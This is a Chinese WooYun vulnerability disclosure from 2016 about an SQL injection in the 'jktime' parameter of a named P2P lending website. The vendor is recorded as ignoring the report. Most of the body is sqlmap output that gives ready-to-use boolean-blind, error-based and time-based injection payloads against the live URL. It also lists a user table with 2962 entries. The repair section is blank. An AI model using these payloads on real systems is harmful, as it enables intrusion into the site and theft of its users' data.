wybug_title: P2P金融助商贷存在sql注入漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2016-01-04：	积极联系厂商并且等待厂商认领中，细节不对外公开									2016-02-12：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 助商贷sql注入 详细说明：  注入点-u http://www.scyd360.com/product.php --data="jktime=6"sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: jktime    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: jktime=6 AND 5700=5700    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: jktime=6 AND (SELECT 7351 FROM(SELECT COUNT(*),CONCAT(0x3a6561683a,(SELECT (CASE WHEN (7351=7351) THEN 1 ELSE 0 END)),0x3a6873763a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: jktime=6 AND SLEEP(5)---Database: scyd+-----------+---------+| Table     | Entries |+-----------+---------+| scyd_user | 2962    |+-----------+---------+   漏洞证明：  

   修复方案：     版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
